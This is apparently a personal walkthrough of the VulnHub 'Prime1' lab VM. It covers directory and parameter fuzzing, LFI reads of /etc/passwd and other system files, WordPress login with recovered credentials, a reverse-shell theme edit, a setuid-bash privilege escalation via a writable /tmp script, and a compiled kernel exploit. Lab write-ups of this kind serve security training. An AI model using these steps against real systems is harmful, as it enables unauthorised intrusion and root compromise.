# Recon

## NMAP
- tcp/22
- tcp/80

## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Prime1]
└─# ffuf -u http://192.168.1.103/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.php,.txt" -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.103/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 20
________________________________________________

                        [Status: 200, Size: 136, Words: 8, Lines: 8]
dev                     [Status: 200, Size: 131, Words: 24, Lines: 8]
image.php               [Status: 200, Size: 147, Words: 8, Lines: 7]
index.php               [Status: 200, Size: 136, Words: 8, Lines: 8]
secret.txt              [Status: 200, Size: 412, Words: 66, Lines: 16]
:: Progress: [18460/18460] :: Job [1/1] :: 414 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```
- `image.php`
- `index.php`
- `/wordpress`
- `/dev` 
- `/secret.txt`

# Initial Foothold

## TCP/80 - HTTP
1. `/secret.txt` & `/dev`
	![](images/Pasted%20image%2020220122002904.png)
	- I think we have to FUZZ the parameter of pages w/ `.php` extension 
	- Before that, enumerate wordpress.
2. Proceed to `/wordpress`, webserver is running Wordpress CMS
	![](images/Pasted%20image%2020220122001759.png)
3. Enumerate wp users
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# wpscan --no-update --disable-tls-checks --url http://$ip/wordpress -e u -f cli-no-color 2>&1 		| tee "/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_user_enum.txt"

	[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
	 | Found By: Rss Generator (Passive Detection)
	 |  - http://192.168.1.103/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=5.2.2</generator>
	 |  - http://192.168.1.103/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.2</generator>

	[i] User(s) Identified:
	[+] victor
	 | Found By: Author Posts - Display Name (Passive Detection)
	 | Confirmed By:
	 |  Rss Generator (Passive Detection)
	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 |  Login Error Messages (Aggressive Detection)
	```
4. Bruteforce
	```
	 wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://$ip/wordpress --usernames victor --passwords /usr/share/wordlists/rockyou.txt -f  cli-no-color 2>&1 | tee "/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt"
	```
	- Failed
5. Enumerate wp plugins
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# 
	wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip/wordpress -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Prime1/192.168.1.103/scans/tcp80/tcp_80_http_wpscan_plugin_enum.txt"

	[i] Plugin(s) Identified:

	[+] akismet
	 | Location: http://192.168.1.103/wordpress/wp-content/plugins/akismet/
	 | Last Updated: 2021-10-01T18:28:00.000Z
	 | Readme: http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt
	 | [!] The version is out of date, the latest version is 4.2.1
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://192.168.1.103/wordpress/wp-content/plugins/akismet/, status: 200
	 |
	 | Version: 4.1.2 (100% confidence)
	 | Found By: Readme - Stable Tag (Aggressive Detection)
	 |  - http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt
	 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
	 |  - http://192.168.1.103/wordpress/wp-content/plugins/akismet/readme.txt
	```
6. Back to `/secret.txt`
	- We are supposed to enumerate the parameters of pages w/ `.php` extension
	- Pages w/ `.php`
		- `index.php`
		- `image.php`
7. Enumerate `/index.php?<Enumerate>`
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# ffuf -u http://192.168.1.103/index.php?FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.php,.txt" --recursion -of ffuf-recursion-directory-list-2.3-medium.txt -fw 8

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.1.103/index.php?FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .php .txt 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 8
	________________________________________________

	file                    [Status: 200, Size: 206, Words: 15, Lines: 8]
	:: Progress: [18460/18460] :: Job [1/1] :: 3979 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
	```
	![](images/Pasted%20image%2020220122012343.png)
	- It says digging wrong file, tried to enumerate `image.php` still did not find anything
8. Enumerate second parameter `/index.php?file=<Enumerate>`
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# ffuf -u http://192.168.1.103/index.php?file=FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.php,.txt" --recursion -of ffuf-recursion-directory-list-2.3-medium.txt -fw 8,15

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.1.103/index.php?file=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .php .txt 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 8,15
	________________________________________________

	location.txt            [Status: 200, Size: 334, Words: 37, Lines: 9]
	:: Progress: [18460/18460] :: Job [1/1] :: 4433 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
	![](images/Pasted%20image%2020220122012249.png)
	- `secrettier360`
9. Enumerate `/image.php?<Enumerate>`
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# echo "secrettier360" >> common.txt 
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# ffuf -u http://192.168.1.103/image.php?FUZZ -w common.txt  -fw 8

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.1.103/image.php?FUZZ
	 :: Wordlist         : FUZZ: common.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 8
	________________________________________________

	secrettier360           [Status: 200, Size: 197, Words: 13, Lines: 7]
	:: Progress: [4617/4617] :: Job [1/1] :: 13031 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
10. Enumerate `/image.php?secrettier360=<Enumerate>`
	- Tried
		- `common.txt`,
		- `directory-2.3-medium.txt`
	- Instead, try LFI wordlist
11. Enumerate `/image.php?secrettier360=<Enumerate>` for LFI
	```
	┌──(root💀kali)-[~/vulnHub/Prime1]
	└─# ffuf -u http://192.168.1.103/image.php?secrettier360=FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt  -fw 13

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.1.103/image.php?secrettier360=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 13
	________________________________________________

	/../../../../../../../../../../etc/passwd [Status: 200, Size: 2616, Words: 48, Lines: 50]
	/etc/adduser.conf       [Status: 200, Size: 3225, Words: 414, Lines: 95]
	/etc/anacrontab         [Status: 200, Size: 598, Words: 34, Lines: 20]
	/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 719, Words: 53, Lines: 21]
	/etc/apache2/apache2.conf [Status: 200, Size: 7312, Words: 942, Lines: 228]
	/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 1477, Words: 125, Lines: 39]
	/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 719, Words: 53, Lines: 21]
	/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 3571, Words: 325, Lines: 103]
	/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 1040, Words: 127, Lines: 31]
	/etc/apache2/envvars    [Status: 200, Size: 1979, Words: 202, Lines: 54]
	/etc/apache2/mods-available/mime.conf [Status: 200, Size: 7836, Words: 954, Lines: 256]
	/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 3307, Words: 443, Lines: 92]
	/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 7836, Words: 954, Lines: 256]
	/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 354, Words: 27, Lines: 12]
	/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 1019, Words: 136, Lines: 34]
	/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 921, Words: 121, Lines: 27]
	/etc/apache2/mods-available/dir.conf [Status: 200, Size: 354, Words: 27, Lines: 12]
	/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 946, Words: 94, Lines: 36]
	/etc/apache2/sites-enabled/000-default.conf [Status: 200, Size: 1529, Words: 184, Lines: 38]
	/etc/avahi/avahi-daemon.conf [Status: 200, Size: 1944, Words: 142, Lines: 75]
	/etc/bluetooth/network.conf [Status: 200, Size: 317, Words: 23, Lines: 13]
	/etc/bluetooth/input.conf [Status: 200, Size: 594, Words: 65, Lines: 20]
	/etc/bluetooth/main.conf [Status: 200, Size: 4071, Words: 554, Lines: 96]
	/etc/apache2/ports.conf [Status: 200, Size: 517, Words: 48, Lines: 22]
	/etc/apt/sources.list   [Status: 200, Size: 3100, Words: 308, Lines: 58]
	/etc/bash.bashrc        [Status: 200, Size: 2385, Words: 387, Lines: 75]
	/boot/grub/grub.cfg     [Status: 200, Size: 8897, Words: 894, Lines: 266]
	/etc/cups/cupsd.conf    [Status: 200, Size: 4827, Words: 574, Lines: 147]
	/etc/default/grub       [Status: 200, Size: 1497, Words: 157, Lines: 41]
	/etc/dhcp/dhclient.conf [Status: 200, Size: 1932, Words: 180, Lines: 61]
	/etc/debconf.conf       [Status: 200, Size: 3166, Words: 423, Lines: 90]
	/etc/fstab              [Status: 200, Size: 866, Words: 172, Lines: 19]
	/etc/fuse.conf          [Status: 200, Size: 477, Words: 50, Lines: 15]
	/etc/crontab            [Status: 200, Size: 945, Words: 116, Lines: 23]
	/etc/host.conf          [Status: 200, Size: 289, Words: 28, Lines: 10]
	/etc/deluser.conf       [Status: 200, Size: 801, Words: 98, Lines: 27]
	/etc/hdparm.conf        [Status: 200, Size: 4978, Words: 746, Lines: 143]
	/etc/ca-certificates.conf [Status: 200, Size: 7985, Words: 76, Lines: 191]
	/etc/hosts.allow        [Status: 200, Size: 608, Words: 94, Lines: 17]
	/etc/hosts.deny         [Status: 200, Size: 908, Words: 140, Lines: 24]
	/etc/ld.so.conf         [Status: 200, Size: 231, Words: 14, Lines: 9]
	/etc/init.d/apache2     [Status: 200, Size: 8284, Words: 1479, Lines: 357]
	/etc/logrotate.conf     [Status: 200, Size: 900, Words: 131, Lines: 43]
	/etc/kernel-img.conf    [Status: 200, Size: 307, Words: 25, Lines: 11]
	/etc/kbd/config         [Status: 200, Size: 3263, Words: 456, Lines: 83]
	/etc/hosts              [Status: 200, Size: 418, Words: 32, Lines: 16]
	/etc/ldap/ldap.conf     [Status: 200, Size: 529, Words: 35, Lines: 24]
	/etc/login.defs         [Status: 200, Size: 10748, Words: 1650, Lines: 348]
	/etc/issue.net          [Status: 200, Size: 216, Words: 15, Lines: 8]
	/etc/issue              [Status: 200, Size: 223, Words: 17, Lines: 9]
	/etc/modules            [Status: 200, Size: 392, Words: 45, Lines: 12]
	/etc/manpath.config     [Status: 200, Size: 5367, Words: 541, Lines: 138]
	/etc/lsb-release        [Status: 200, Size: 302, Words: 15, Lines: 11]
	/etc/network/interfaces [Status: 200, Size: 279, Words: 24, Lines: 10]
	/etc/mtools.conf        [Status: 200, Size: 821, Words: 90, Lines: 32]
	/etc/mtab               [Status: 200, Size: 2521, Words: 163, Lines: 37]
	/etc/ltrace.conf        [Status: 200, Size: 15064, Words: 1023, Lines: 550]
	/etc/mysql/my.cnf       [Status: 200, Size: 879, Words: 101, Lines: 28]
	/etc/pam.conf           [Status: 200, Size: 749, Words: 77, Lines: 22]
	/etc/os-release         [Status: 200, Size: 495, Words: 18, Lines: 18]
	/etc/networks           [Status: 200, Size: 288, Words: 23, Lines: 9]
	/etc/nsswitch.conf      [Status: 200, Size: 726, Words: 143, Lines: 27]
	/etc/profile            [Status: 200, Size: 772, Words: 157, Lines: 34]
	/etc/pulse/client.conf  [Status: 200, Size: 1398, Words: 182, Lines: 42]
	/etc/rpc                [Status: 200, Size: 1084, Words: 48, Lines: 47]
	/etc/resolv.conf        [Status: 200, Size: 369, Words: 40, Lines: 10]
	/etc/security/sepermit.conf [Status: 200, Size: 616, Words: 118, Lines: 18]
	/etc/security/pam_env.conf [Status: 200, Size: 3169, Words: 441, Lines: 80]
	/etc/security/namespace.conf [Status: 200, Size: 1637, Words: 231, Lines: 35]
	/etc/security/limits.conf [Status: 200, Size: 2347, Words: 758, Lines: 63]
	/etc/security/access.conf [Status: 200, Size: 4817, Words: 703, Lines: 129]
	/etc/security/time.conf [Status: 200, Size: 2376, Words: 354, Lines: 72]
	/etc/sensors3.conf      [Status: 200, Size: 10565, Words: 2595, Lines: 530]
	/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 798, Words: 15, Lines: 8]
	/etc/security/group.conf [Status: 200, Size: 3832, Words: 702, Lines: 113]
	/etc/ssh/sshd_config    [Status: 200, Size: 2739, Words: 254, Lines: 95]
	/etc/ssh/ssh_config     [Status: 200, Size: 1953, Words: 281, Lines: 63]
	/etc/sysctl.conf        [Status: 200, Size: 2281, Words: 243, Lines: 67]
	/etc/updatedb.conf      [Status: 200, Size: 535, Words: 49, Lines: 11]
	/proc/cpuinfo           [Status: 200, Size: 1101, Words: 126, Lines: 34]
	/proc/cmdline           [Status: 200, Size: 367, Words: 21, Lines: 8]
	/proc/loadavg           [Status: 200, Size: 225, Words: 17, Lines: 8]
	/proc/ioports           [Status: 200, Size: 1899, Words: 366, Lines: 71]
	/proc/meminfo           [Status: 200, Size: 1532, Words: 480, Lines: 55]
	/proc/interrupts        [Status: 200, Size: 3649, Words: 1375, Lines: 72]
	/proc/devices           [Status: 200, Size: 776, Words: 115, Lines: 68]
	/proc/net/dev           [Status: 200, Size: 648, Words: 250, Lines: 11]
	/proc/net/arp           [Status: 200, Size: 510, Words: 161, Lines: 11]
	/proc/net/route         [Status: 200, Size: 709, Words: 296, Lines: 11]
	/proc/partitions        [Status: 200, Size: 373, Words: 101, Lines: 14]
	/proc/net/fib_trie      [Status: 200, Size: 1388, Words: 495, Lines: 53]
	/proc/net/udp           [Status: 200, Size: 1093, Words: 244, Lines: 14]
	/proc/modules           [Status: 200, Size: 3692, Words: 343, Lines: 73]
	/proc/net/tcp           [Status: 200, Size: 4697, Words: 1717, Lines: 37]
	/proc/mounts            [Status: 200, Size: 2521, Words: 163, Lines: 37]
	/proc/self/net/arp      [Status: 200, Size: 510, Words: 161, Lines: 11]
	/proc/self/status       [Status: 200, Size: 1501, Words: 109, Lines: 60]
	/proc/version           [Status: 200, Size: 361, Words: 31, Lines: 8]
	/proc/swaps             [Status: 200, Size: 301, Words: 44, Lines: 9]
	/proc/self/stat         [Status: 200, Size: 521, Words: 64, Lines: 8]
	/proc/stat              [Status: 200, Size: 3354, Words: 1499, Lines: 16]
	/proc/self/mounts       [Status: 200, Size: 2521, Words: 163, Lines: 37]
	/proc/sched_debug       [Status: 200, Size: 95623, Words: 46222, Lines: 1748]
	/usr/share/adduser/adduser.conf [Status: 200, Size: 3225, Words: 414, Lines: 95]
	/var/log/Xorg.0.log     [Status: 200, Size: 21739, Words: 3579, Lines: 312]
	/var/log/lastlog        [Status: 200, Size: 292781, Words: 16, Lines: 7]
	/var/log/dpkg.log       [Status: 200, Size: 334681, Words: 20815, Lines: 4180]
	:: Progress: [2249/2249] :: Job [1/1] :: 5601 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
	```
	- It is susceptible to LFI
12. View `/etc/passwd`
	![](images/Pasted%20image%2020220122014625.png)
	- Find `password.txt` in my directory
13. Found password
	![](images/Pasted%20image%2020220122014741.png)
	- victor:follow_the_ippsec
14. Login to wordpress w/ victor:follow_the_ippsec
15. Tried to upload via
	- Replacing `404.php` w/ reverse shell
	- Uploading `php-reverse-shell.php` to plugins
	- All failed
16. After browsing through Pages in Theme Editor, found a writable file
	![](images/Pasted%20image%2020220122015529.png)
17. Replace `secret.php` w/ reverse shell
18. Execute reverse shell at 
	```
	http://192.168.1.103/wordpress/wp-content/themes/twentynineteen/secret.php
	```
19. Obtained www-data shell
	![](images/Pasted%20image%2020220122015905.png)
20. Obtain flag
	```
	www-data@ubuntu:/home/saket$ cat user.txt 
	af3c658dcf9d7190da3153519c003456
	```
	

# Privilege Escalation

## Saket - Via Sudo + Creds Found + Cryptography 
1. Check for sudo access
	```
	www-data@ubuntu:/var/www/html$ sudo -l
	Matching Defaults entries for www-data on ubuntu:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on ubuntu:
		(root) NOPASSWD: /home/saket/enc
	```
2. Check permissions of `/home/saket/enc`
	```
	www-data@ubuntu:/var/www/html$ ls -l /home/saket/enc
	-rwxr-x--x 1 root root 14272 Aug 30  2019 /home/saket/enc
	www-data@ubuntu:/var/www/html$ cat /home/saket/enc
	```
	- Can only execute it
3. Execute it, see what it does
	```
	www-data@ubuntu:/home/saket$ sudo ./enc
	enter password: test
	www-data@ubuntu:/home/saket$ 
	```
4. Tried to do command injection, failed
5. Look for passwords in the Linux file system
	```
	www-data@ubuntu:/$ find / 2>/dev/null | grep -v /usr/share | grep pass
	/usr/lib/pppd/2.4.7/passwordfd.so
	/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc
	/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
	/usr/lib/python2.7/getpass.py
	/usr/lib/apache2/modules/mod_proxy_fdpass.so
	/usr/lib/gnupg2/gpg-preset-passphrase
	/usr/lib/python3.5/getpass.py
	/run/systemd/ask-password
	/bin/systemd-tty-ask-password-agent
	/bin/systemd-ask-password
	/opt/backup/server_database/backup_pass <- BACKUP PASS
	```
	- Found `/opt/backup/server_database/backup_pass`
6. Linpeas also enumerated `/opt/backup/server_database/backup_pass`
	![](images/Pasted%20image%2020220122022304.png)
7. View its content
	```
	www-data@ubuntu:/$ cat /opt/backup/server_database/backup_pass
	your password for backup_database file enc is 

	"backup_password"

	Enjoy!
	www-data@ubuntu:/$ 
	```
8. Execute `enc` 
	```
	www-data@ubuntu:/home/saket$ sudo /home/saket/enc
	enter password: backup_password
	good
	www-data@ubuntu:/home/saket$ ls -la
	total 44
	drwxr-xr-x 2 root root  4096 Jan 21 10:12 .
	drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
	-rw------- 1 root root    20 Aug 31  2019 .bash_history
	-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
	-rw-r--r-- 1 root root   237 Jan 21 10:23 enc.txt
	-rw-r--r-- 1 root root   123 Jan 21 10:23 key.txt
	-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
	-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
	www-data@ubuntu:/home/saket$ cat enc.txt
	nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
	
	www-data@ubuntu:/home/saket$ cat key.txt 
	I know you are the fan of ippsec.

	So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

	```
	- `enc.txt` & `key.txt` is generated
	- `enc.txt` is encrypted by base64
9. Generate md5hash from ippsec
	```
	www-data@ubuntu:/home/saket$ echo -n ippsec | md5sum 
	366a74cb3c959de17d61db30591c39d1  
	```
10. Base64 decode `enc.txt`
	```
	www-data@ubuntu:/home/saket$ base64 -d enc.txt 
	?L.�ocX(���K��r�t�=���B�w�w����8*_���E#�����m8Bz\�7p��Jv��v�,6ב��;X�G'+��P���Xٙ�׿;j;f���YS1
																							  �
	```
	- It does not work
11. We probably have to do something w/ md5sum in order to decrypt `enc.txt`
	- I had to look for writeups in order to solve this
	- https://www.devglan.com/online-tools/aes-encryption-decryption
	- https://crypto.stackexchange.com/questions/85723/identify-aes-mode
12. Found an AES Online Decryption Tool
	![](images/Pasted%20image%2020220122032918.png)
13. Base64 decode the output
	```
	www-data@ubuntu:/home/saket$ echo -n RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw= | base64 -d
	Dont worry saket one day we will reach to
	our destination very soon. And if you forget 
	your username then use your old password
	==> "tribute_to_ippsec"

	Victor,www-data@ubuntu:/home/saket$ 
	```
	- victor:tribute_to_ippsec
14. Switch to user saket
	```
	saket@ubuntu:~$ su saket
	Password: tribute_to_ippsec
	saket@ubuntu:~$ 
	```
	![](images/Pasted%20image%2020220122034745.png)
	
## Root - Via Sudo + 
1. Check for sudo access 
	```
	saket@ubuntu:~$ sudo -l
	Matching Defaults entries for saket on ubuntu:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User saket may run the following commands on ubuntu:
		(root) NOPASSWD: /home/victor/undefeated_victor
	saket@ubuntu:~$ 
	```
2. Execute `/home/victor/undefeated_victor`
	```
	saket@ubuntu:~$ sudo /home/victor/undefeated_victor
	if you can defeat me then challenge me in front of you
	/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
	```
	- Binary is trying to open/access `/tmp/challenge` 
3. Create `/tmp/challenge`, that will create rootbash, allowing us to obtain root.
	```
	printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /tmp/challenge; chmod 4777 /tmp/challenge;
	```
4. Execute `/home/victor/undefeated_victor`, obtaining root shell
	```
	saket@ubuntu:~$ sudo /home/victor/undefeated_victor
	if you can defeat me then challenge me in front of you
	saket@ubuntu:~$ ls -l /tmp
	total 1952
	-rwsrwxrwx 1 saket    saket         67 Jan 21 11:41 challenge
	drwxrwxrwx 3 www-data www-data    4096 Jan 21 10:10 home
	-rw-rw-rw- 1 www-data www-data  157929 Jan 21 10:20 linpeas.out
	-rwxrwxrwx 1 www-data www-data  762836 Dec 31 07:16 linpeas.sh
	-rw-rw-rw- 1 www-data www-data     174 Jan 21 10:10 myfiles.zip
	-rwsr-xr-x 1 root     root     1037528 Jan 21 11:41 rootbash
	drwx------ 3 root     root        4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-colord.service-BhFB5M
	drwx------ 3 root     root        4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-rtkit-daemon.service-Ag5X2A
	drwx------ 3 root     root        4096 Jan 21 08:53 systemd-private-da7327ba5fda4813bbe7f7867c8991dd-systemd-timesyncd.service-HUin4K
	drwxrwxrwt 2 root     root        4096 Jan 21 08:53 VMwareDnD
	drwx------ 2 root     root        4096 Jan 21 08:53 vmware-root
	saket@ubuntu:~$ /tmp/rootbash -p
	rootbash-4.3# whoami
	root
	rootbash-4.3# 
	```
	![](images/Pasted%20image%2020220122035056.png)
5. Obtain flag
	```
	rootbash-4.3# cat root.txt 
	b2b17036da1de94cfb024540a8e7075a
	rootbash-4.3# 
	```
	![](images/Pasted%20image%2020220122035136.png)

## Root - Via Kernel Exploit
1. Ran linpeas
	![](Pasted%20image%2020220122041103.png)
2. Search for kernel exploits
	```
	┌──(root💀kali)-[~/vulnHub/Prime1/192.168.1.103/exploit/kernel]
	└─# searchsploit linux 4.10.
	-----------------------------------------------------------------------------------------------
	Exploit Title                                                            |  Path
	-----------------------------------------------------------------------------------------------
	Linux Kernel<4.13.9(Ubuntu 16.04 / Fedora 27)-Local Privilege Escalation | linux/local/45010.c
	-----------------------------------------------------------------------------------------------
	```
	- https://www.exploit-db.com/exploits/45010
3. Compile Exploit
	```
	┌──(root💀kali)-[~/vulnHub/Prime1/192.168.1.103/exploit/kernel]
	└─# gcc 45010.c -m64 -o exploit -D_GNU_SOURCE
	```
4. Transfer & Exploit
	![](Pasted%20image%2020220122042300.png)

	
---
Tags: #exploit/file-inclusion/lfi  #tcp/80-http/cms/wordpress #tcp/80-http/rce #linux-priv-esc/sudo/unknown-exec #linux-priv-esc/linux-creds-found  #cryptography #linux-priv-esc/kernel-exploit 

---